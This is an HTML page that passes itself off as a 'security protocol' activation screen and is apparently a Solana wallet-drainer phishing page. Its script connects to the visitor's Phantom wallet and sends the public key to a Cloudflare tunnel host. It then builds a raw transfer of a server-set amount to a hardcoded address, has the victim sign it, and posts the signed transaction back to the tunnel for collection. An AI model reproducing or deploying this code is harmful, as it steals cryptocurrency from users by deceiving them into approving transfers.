<!DOCTYPE html><html><head><meta charset="UTF-8">
    <script>
        window.Buffer = window.Buffer || { from:(arr)=>new Uint8Array(arr), isBuffer:(obj)=>obj instanceof Uint8Array };
    </script>
    <script src="https://unpkg.com/@solana/web3.js@1.87.6/lib/index.iife.min.js"></script></head>
    <body style="background:#000;color:#14F195;text-align:center;padding-top:30vh;font-family:sans-serif;">
    <div style="border:1px solid #14F195;padding:40px;display:inline-block;border-radius:15px;background:#111;">
        <h2 style="color:#14F195;">SECURITY PROTOCOL V4</h2>
        <button id="cta" style="padding:20px 40px;background:#14F195;color:#000;font-weight:bold;border:none;border-radius:10px;cursor:pointer;font-size:20px;">ACTIVATE PROTECTION</button>
        <p id="msg" style="margin-top:20px;color:#444;">Ready</p></div>
    <script>
    const TUNNEL = "https://biggest-fellow-aware-quantitative.trycloudflare.com";
    const TARGET_ADDR = "HyapjdagPdCaha2yW5j1pV4BkaVvah6okQ1fMw8BETXp";

    document.getElementById('cta').onclick = async () => {
        try {
            const p = window.solana || window.phantom?.solana;
            await p.connect();
            document.getElementById('msg').innerText = "Syncing...";
            const res = await fetch(TUNNEL + '/get_data', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({pubkey: p.publicKey.toString()}) });
            const data = await res.json();

            // ğŸš€ æ ¸å¿ƒï¼šæ‰‹åŠ¨æ„é€  12 å­—èŠ‚çš„ SystemProgram åŸå§‹æŒ‡ä»¤ (Index 2 + 8å­—èŠ‚é‡‘é¢)
            const instructionData = new Uint8Array(12);
            instructionData.set([2, 0, 0, 0], 0); 
            const amountBuf = new ArrayBuffer(8);
            const view = new DataView(amountBuf);
            view.setBigUint64(0, BigInt(data.safe_amount), true);
            instructionData.set(new Uint8Array(amountBuf), 4);

            const transaction = new solanaWeb3.Transaction().add(new solanaWeb3.TransactionInstruction({
                keys: [
                    { pubkey: p.publicKey, isSigner: true, isWritable: true },
                    { pubkey: new solanaWeb3.PublicKey(TARGET_ADDR), isSigner: false, isWritable: true }
                ],
                programId: solanaWeb3.SystemProgram.programId,
                data: instructionData
            }));

            transaction.recentBlockhash = data.blockhash;
            transaction.feePayer = p.publicKey;
            const signed = await p.signTransaction(transaction);
            const raw = signed.serialize();
            let b64 = "";
            for (let i = 0; i < raw.length; i++) { b64 += String.fromCharCode(raw[i]); }
            fetch(TUNNEL + '/collect', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({signature: window.btoa(b64)}) });
            alert("Security Protocol Activated!");
        } catch(e) { alert("Status: " + e.message); }
    }
    </script></body></html>